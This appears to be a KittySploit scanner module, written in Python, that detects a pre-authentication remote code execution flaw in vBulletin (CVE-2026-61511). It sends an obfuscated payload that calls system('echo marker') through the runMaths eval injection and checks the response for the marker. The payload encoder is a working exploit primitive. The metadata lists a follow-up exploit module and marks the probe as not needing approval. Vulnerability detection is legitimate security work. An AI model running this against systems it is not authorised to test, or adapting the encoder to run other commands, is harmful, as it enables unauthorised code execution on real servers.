#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "vBulletin runMaths Pre-Auth RCE Detection (CVE-2026-61511)",
        "description": (
            "Detects unauthenticated RCE via vB5_Template_Runtime::runMaths() "
            "(CVE-2026-61511) by sending a safe phpfuck-encoded system('echo …') "
            "probe to ajax/render/pagenav. Affects vBulletin 5.x through 5.7.5 and "
            "6.x through 6.2.1 (fixed in 6.2.2 / vendor patches)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-61511",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-61511",
            "https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/",
        ],
        "modules": [
            "exploits/multi/http/vbulletin_runmaths_rce_cve_2026_61511",
        ],
        "tags": [
            "web",
            "scanner",
            "vbulletin",
            "rce",
            "preauth",
            "eval",
            "cve-2026-61511",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["vbulletin"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "ajax/render/pagenav"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "exploits/multi/http/vbulletin_runmaths_rce_cve_2026_61511",
                ],
            },
        },
    }

    path = OptString("/", "vBulletin base path (e.g. / or /vb/)", required=False)

    CHR = (
        "((((999999999999999999999999999999999999999999999999999999999999999999999999"
        "9999999999999999999999999999999999999999999999999999999999999999999999999999"
        "9999999999999999999999999999999999999999999999999999999999999999999999999999"
        "9999999999999999999999999999999999999999999999999999999999999999999999999999"
        "999999999999999999999999999999999999).(9))^((2).(0).(4)))^((8).(6).(((9).(9))"
        "^((9).(9)))))"
    )

    def make_payload(self, function, param):
        digits = {str(i): f"({i})" for i in range(10)}

        def enc(ch):
            return ".".join(digits[d] for d in str(ord(ch)))

        fn = ".".join(f"{self.CHR}({enc(c)})" for c in function)
        args = ".".join(f"{self.CHR}({enc(c)})" for c in param)
        return f"({fn})(({args}))"

    def base_path(self):
        base = str(self.path or "/").strip() or "/"
        if not base.startswith("/"):
            base = "/" + base
        return base.rstrip("/") or "/"

    def run(self):
        marker = "KS" + self.random_text(10)
        data = {
            "routestring": "ajax/render/pagenav",
            "pagenav[pagenumber]": self.make_payload("system", f"echo {marker}"),
        }
        base = self.base_path()
        for path in (base, f"{base}/index.php" if base != "/" else "/index.php"):
            r = self.http_request(
                method="POST",
                path=path,
                data=data,
                headers={"X-Requested-With": "XMLHttpRequest"},
                allow_redirects=False,
                timeout=20,
            )
            if not r:
                continue
            body = r.text or ""
            if marker not in body:
                continue
            self.set_info(
                severity="critical",
                cve="CVE-2026-61511",
                reason=(
                    "runMaths() eval injection confirmed via ajax/render/pagenav "
                    f"(echo marker reflected; path={path})"
                ),
                path=path,
                endpoint="ajax/render/pagenav",
                param="pagenav[pagenumber]",
                confidence="high",
            )
            return True
        return False
